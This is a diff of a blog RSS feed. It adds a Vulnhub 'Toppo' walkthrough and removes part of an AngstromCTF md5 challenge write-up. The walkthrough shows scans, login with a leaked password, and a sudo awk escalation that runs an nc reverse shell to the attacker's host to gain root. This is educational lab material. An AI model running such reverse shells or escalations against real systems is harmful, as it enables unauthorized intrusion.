@@ -7,6 +7,230 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Vulnhub.com - Toppo: 1</title>
+        <description>&lt;p&gt;Today we’re going to work through easy machine from Vulnhub called &lt;strong&gt;&lt;em&gt;Toppo&lt;/em&gt;&lt;/strong&gt;. If you don’t have time, but still want to get these shells, just try this machine.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;The Machine isn't hard to own and don't require advanced exploitation .
+
+Level : Beginner
+
+DHCP : activated
+
+Inside the zip you will find a vmdk file , and I think you will be able to use it with any usual virtualization software ( tested with Virtualbox) .
+
+If you have any question : my twitter is @h4d3sw0rm
+
+Happy Hacking !&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/@h4d3sw0rm&quot;&gt;Hadi Mene&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/toppo_1,245/&quot;&gt;https://www.vulnhub.com/entry/toppo_1,245/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Big thanks to the author for creating this challenge and for Vulnhub for hosting and curating this great set of machines!&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Firstly let’s start with our usual &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan in order to view the open ports on this machine.&lt;/p&gt;
+
+&lt;p&gt;What parameters I’m using?&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;-v&lt;/em&gt; - verbose output&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-sS&lt;/em&gt; - TCP-SYN scan&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-A&lt;/em&gt; - OS detection, version detection and traceroute&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-T4&lt;/em&gt; - aggresive scan&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-p-&lt;/em&gt; - scan all 65535 ports&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.0.0.6
+Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-07-12 12:38 EDT
+NSE: Loaded 148 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.00s elapsed
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.00s elapsed
+Initiating ARP Ping Scan at 12:38
+Scanning 10.0.0.6 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
+Completed ARP Ping Scan at 12:38, 0.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Parallel DNS resolution of 1 host. at 12:38
+Completed Parallel DNS resolution of 1 host. at 12:38, 0.00s elapsed
+Initiating SYN Stealth Scan at 12:38
+Scanning 10.0.0.6 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.0.0.6
+Discovered open port 22/tcp on 10.0.0.6
+Discovered open port 111/tcp on 10.0.0.6
+Discovered open port 50394/tcp on 10.0.0.6
+Completed SYN Stealth Scan at 12:38, 4.12s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Service scan at 12:38
+Scanning 4 services on 10.0.0.6
+Completed Service scan at 12:38, 11.02s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.0.6&lt;/span&gt;
+NSE: Script scanning 10.0.0.6.
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.38s elapsed
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.01s elapsed
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.6
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00046s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp    open  http    Apache httpd 2.4.10 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Clean Blog - Start Bootstrap Theme
+111/tcp   open  rpcbind 2-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          49973/udp  status
+|_  100024  1          50394/tcp  status
+50394/tcp open  status  1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100024)&lt;/span&gt;
+MAC Address: 08:00:27:C5:CA:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Uptime guess: 0.010 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Thu Jul 12 12:23:50 2018&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Network Distance: 1 hop
+TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;261 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.46 ms 10.0.0.6
+
+NSE: Script Post-scanning.
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.00s elapsed
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;18.17 seconds
+           Raw packets sent: 65558 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.885MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65550 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.623MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From here I can see only one service that’s worth looking at the start, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; running on port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt;. While looking manually at the website, I decided to run &lt;code class=&quot;highlighter-rouge&quot;&gt;nikto&lt;/code&gt; to scan the website.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.0.6
+- Nikto v2.1.6
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ Target IP:          10.0.0.6
++ Target Hostname:    10.0.0.6
++ Target Port:        80
++ Start Time:         2018-07-12 12:20:26 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
++ Server: Apache/2.4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
++ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Apache/2.4.10 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least Apache/2.4.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Apache 2.0.65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;final release&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 2.2.29 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3268: /admin/: Directory indexing found.
++ OSVDB-3092: /admin/: This might be interesting...
++ OSVDB-3268: /img/: Directory indexing found.
++ OSVDB-3092: /img/: This might be interesting...
++ OSVDB-3268: /mail/: Directory indexing found.
++ OSVDB-3092: /mail/: This might be interesting...
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7517 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 15 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
++ End Time:           2018-07-12 12:20:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;27 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Here we have, an &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/&lt;/code&gt; directory. Inside there was a note in &lt;code class=&quot;highlighter-rouge&quot;&gt;notes.txt&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;URL OF NOTE: http://10.0.0.6/admin/notes.txt
+
+Note to myself :
+
+I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;At first I thought about enumerating more in order to find the username, as we already have the password. But stupid me overthought this part way too much.&lt;/p&gt;
+
+&lt;p&gt;I didn’t notice that the username is already &lt;strong&gt;&lt;em&gt;in the password&lt;/em&gt;&lt;/strong&gt;. Like what was I thinking, &lt;code class=&quot;highlighter-rouge&quot;&gt;ted&lt;/code&gt; can be the username, and it probably will as this is easy machine.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh ted@10.0.0.6
+ted@10.0.0.6&lt;span class=&quot;s1&quot;&gt;'s password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29
+
+ted@Toppo:~$ ls -la
+total 24
+drwxr-xr-x 2 ted  ted  4096 Jul 16 12:55 .
+drwxr-xr-x 3 root root 4096 Apr 15 10:08 ..
+-rw------- 1 ted  ted     1 Apr 15 12:33 .bash_history
+-rw-r--r-- 1 ted  ted   220 Apr 15 10:08 .bash_logout
+-rw-r--r-- 1 ted  ted  3515 Apr 15 10:08 .bashrc
+-rw-r--r-- 1 ted  ted   675 Apr 15 10:08 .profile&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Of course that the password works. Now we have to escalate our privilages. Here comes good old &lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;G0tm1k post&lt;/a&gt; and while trying different steps I’ve noticed this entry in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ted@Toppo:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/sudoers
+ted &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/awk&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now I decided to check whether &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; is installed on the system.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ted@Toppo:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which nc
+/bin/nc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And now we can use simple &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; function from &lt;code class=&quot;highlighter-rouge&quot;&gt;awk&lt;/code&gt; in order to run the reverse shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ted@Toppo:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'BEGIN {system(&quot;nc -e /bin/sh 10.0.0.4 1337&quot;)}'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can look at the ouputu of the previously started listener.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1337
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1337 ...
+10.0.0.6: inverse host lookup failed: Unknown host
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.6] 52985
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 24
+drwx------  2 root root 4096 Apr 15 11:40 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 21 root root 4096 Apr 15 10:02 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root   53 Apr 15 12:28 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  570 Jan 31  2010 .bashrc
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  397 Apr 15 10:19 flag.txt
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Nov 19  2007 .profile
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+_________                                  
+|  _   _  |                                 
+|_/ | | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;|.--.   _ .--.   _ .--.    .--.   
+    | |  / .&lt;span class=&quot;s1&quot;&gt;'`\ \[ '&lt;/span&gt;/&lt;span class=&quot;s1&quot;&gt;'`\ \[ '&lt;/span&gt;/&lt;span class=&quot;s1&quot;&gt;'`\ \/ .'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;
+   _| |_ | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_. | | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/ | | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/ &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_. | 
+  |_____| &lt;span class=&quot;s1&quot;&gt;'.__.'&lt;/span&gt;  | &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;.__/  | &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;.__/  &lt;span class=&quot;s1&quot;&gt;'.__.'&lt;/span&gt;  
+                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;__|     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;__|              
+
+Congratulations &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; there is your flag : 0wnedlab&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;p4ssi0n_c0me_with_pract1ce&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+</description>
+        <pubDate>Mon, 16 Jul 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/vulnhub-toppo/</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnhub-toppo/</guid>
+      </item>
+    
+      <item>
         <title>Pwnable.kr - uaf</title>
         <description>&lt;p&gt;In this challenge we’re going to cover some basics behind the use-after-free bug in some C++ code.&lt;/p&gt;
 
@@ -1812,95 +2036,6 @@ Program exited with code 051.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
         <pubDate>Sat, 31 Mar 2018 02:00:00 +0200</pubDate>
         <link>http://localhost:4000/protostar-0/</link>
         <guid isPermaLink="true">http://localhost:4000/protostar-0/</guid>
-      </item>
-    
-      <item>
-        <title>AngstromCTF - md5</title>
-        <description>&lt;p&gt;As we’ve finished the previous web challenge, let’s jump into the next one called &lt;code class=&quot;highlighter-rouge&quot;&gt;md5&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Category: Web&lt;/li&gt;
-  &lt;li&gt;Points: 140&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;defund's a true MD5 fan, and he has a site to prove it.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;From the start we’re getting the source code of the challenge.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'secret.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;md5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;md5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;str2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Sorry, you're wrong.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;font-size: 18pt; margin: 10% 10% 10% 10%&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
-    People say that MD5 is broken... But they're wrong! All I have to do is use a secret salt. &amp;gt;:)
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
-    If you can find two distinct strings that—when prepended with my salt—have the same MD5 hash, I'll give you a flag. Deal?
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
-    Also, here's the &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;src&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;source&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;.
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
